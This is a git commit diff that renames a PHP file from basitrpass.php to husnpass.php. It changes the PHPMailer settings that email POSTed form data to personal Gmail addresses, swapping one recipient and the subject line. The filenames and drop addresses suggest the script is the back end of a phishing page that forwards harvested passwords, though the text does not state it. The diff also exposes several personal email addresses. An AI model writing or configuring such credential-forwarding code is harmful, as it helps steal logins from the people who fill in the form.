a5afc93569da3b1c30c6401740bbc334a2a7891d
kameronjustine234 <kameronjustine234@gmail.com>
2025-07-18 01:42:37 +0500

    Update and rename basitrpass.php to husnpass.php

--- husnpass.php
+++ husnpass.php
@@ -36,13 +36,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->setFrom('aliumair0044@gmail.com', 'Pk');
         $mail->addAddress('aliumair0044@gmail.com');
-        $mail->addAddress('goodraza02@gmail.com');
+        $mail->addAddress('ahsandubey726@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Basit';
+        $mail->Subject = 'Hussan';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
